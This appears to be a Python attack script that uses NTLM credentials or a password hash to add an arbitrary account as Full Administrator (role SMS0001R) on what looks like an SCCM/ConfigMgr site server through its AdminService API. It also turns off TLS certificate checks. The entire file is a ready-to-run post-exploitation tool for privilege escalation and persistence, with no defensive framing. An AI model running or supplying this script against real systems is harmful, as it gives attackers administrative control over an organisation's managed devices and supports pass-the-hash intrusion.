import requests
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
import json
import argparse


def jprint(obj):
    text = json.dumps(obj, sort_keys=True, indent=4)
    print(text)


def arg_parse():
    parser = argparse.ArgumentParser(add_help=True, description="Remotely add Site Server Admin")

    parser.add_argument("-t", "--target", action="store", help="Target site server IP or hostname.")
    parser.add_argument("-tu", "--targetuser", action="store", help="Target Username.")
    parser.add_argument("-s", "--sid", action="store", help="Target user's SID.")
    parser.add_argument("-u", "--user", action="store", help="Site Server Admin Username.")
    parser.add_argument("-p", "--password", action="store", help="Site Server Admin Password or Hash (LMHASH:NTHASH")

    args = parser.parse_args()
    return args

def run():
    args = arg_parse()
    target = args.target
    targetuser =  args.targetuser
    sid = args.sid
    username = args.user
    password = args.password
    headers = {'Content-Type': 'application/json; odata=verbose'}
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    
    body = {"LogonName": f"{targetuser}", 
        "AdminSid":f"{sid}",
        "Permissions":[{"CategoryID": "SMS00ALL", 
                        "CategoryTypeID": 29, 
                        "RoleID":"SMS0001R",
                        },
                        {"CategoryID": "SMS00001",
                        "CategoryTypeID": 1, 
                        "RoleID":"SMS0001R", 
                        },
                         {"CategoryID": "SMS00004", 
                        "CategoryTypeID": 1, 
                        "RoleID":"SMS0001R",
                        }],
        "DisplayName":f"{targetuser}"
        }

    url = f"https://{target}/AdminService/wmi/SMS_Admin/"

    try:
        r = requests.post(f"{url}",
                            auth=HttpNtlmAuth(username, password),
                            verify=False,headers=headers, json=body)
        results = r.json()
        jprint(results)
    except Exception as e:
            print(e)

run()
